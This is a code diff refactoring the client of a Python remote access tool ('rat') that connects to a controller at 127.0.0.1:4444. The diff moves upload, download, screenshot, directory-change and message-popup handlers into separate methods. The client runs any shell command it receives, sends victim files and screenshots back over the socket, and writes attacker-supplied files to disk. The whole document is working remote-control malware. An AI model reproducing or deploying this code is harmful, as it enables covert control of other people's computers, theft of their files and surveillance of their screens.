@@ -24,7 +24,54 @@ class CLIENT:
 
     # def installdep(self):
     #     subprocess.run(['pip', 'install', 'pyautogui'])
+    
+    def upload(self):
+        json_data = sock.recv(1024).decode()
+        convert_json = json.loads(json_data)
+        name = convert_json['name']
+        bytes = convert_json['data']
+        b64decoded_bytes = base64.b64decode(bytes)
+        file_name = name.split('.')
+        file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}", 'wb')
+        file.write(b64decoded_bytes)
+        file.close()
         
+    def screenshot(self):
+        file = 'screenshot.png'
+        pyautogui.screenshot(file)
+        file = open(file, 'rb')
+        file_data = file.read()
+        sock.send(file_data)
+        file.close()
+        time.sleep(.2)
+        subprocess.run(['rm', 'screenshot.png'])
+
+    def cd(self, command):
+        os.chdir(command[3:])
+        directory = os.getcwd()
+        str_dir = str(directory)
+        sock.send(str_dir.encode())
+        command = ''
+    
+    def download(self, command):
+        filename = command[9:]
+        file = open(filename, "rb")
+        print(file)
+        bytes = file.read(600000)
+        base64_bytes = base64.b64encode(bytes)
+        file_json = {
+                "name": file.name,
+                "data": base64_bytes.decode()
+                    }
+        file_send = json.dumps(file_json)
+        sock.send(file_send.encode())
+        command = ''
+     
+    def sendmessage(self):
+        message = sock.recv(1024).decode()
+        print(message)
+        subprocess.run(["/usr/bin/notify-send", "--icon=error", message])
+ 
     def main_loop(self):
         while True:
             
@@ -37,25 +84,11 @@ class CLIENT:
                         if command == "exit":
                             break
                         elif command[:2] == 'cd':
-                            os.chdir(command[3:])
-                            directory = os.getcwd()
-                            str_dir = str(directory)
-                            sock.send(str_dir.encode())
-                            command = ''
+                            self.cd(command)
                         elif command[:3] == 'cat':
                             continue
                         elif command[:8] == 'download':
-                            filename = command[9:]
-                            file = open(filename, "rb")
-                            bytes = file.read(600000)
-                            base64_bytes = base64.b64encode(bytes)
-                            file_json = {
-                                "name": file.name,
-                                "data": base64_bytes.decode()
-                            }
-                            file_send = json.dumps(file_json)
-                            sock.send(file_send.encode())
-                            command = ''
+                            self.download(command)
                             continue
                         output = subprocess.getoutput(command)
                         sock.send(output.encode())
@@ -64,33 +97,13 @@ class CLIENT:
                         sock.send(err.encode())
 
             if command == "upload":
-                json_data = sock.recv(1024).decode()
-                convert_json = json.loads(json_data)
-                name = convert_json['name']
-                bytes = convert_json['data']
-                b64decoded_bytes = base64.b64decode(bytes)
-                file_name = name.split('.')
-                # open in binary
-                file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}", 'wb')
-                # #         # receive data and write it to file
-                file.write(b64decoded_bytes)
-                file.close()
+                self.upload()
 
             elif command == "screenshot":
-                file = 'screenshot.png'
-                pyautogui.screenshot(file)
-                file = open(file, 'rb')
-                file_data = file.read()
-                sock.send(file_data)
-                file.close()
-                time.sleep(.2)
-                subprocess.run(['rm', 'screenshot.png'])
+                self.screenshot()
                 continue
-
             elif command == "sendmessage":
-                message = sock.recv(1024).decode()
-                print(message)
-                subprocess.run(["/usr/bin/notify-send", "--icon=error", message])
+                self.sendmessage()
                 continue
 
 rat = CLIENT('127.0.0.1', 4444)
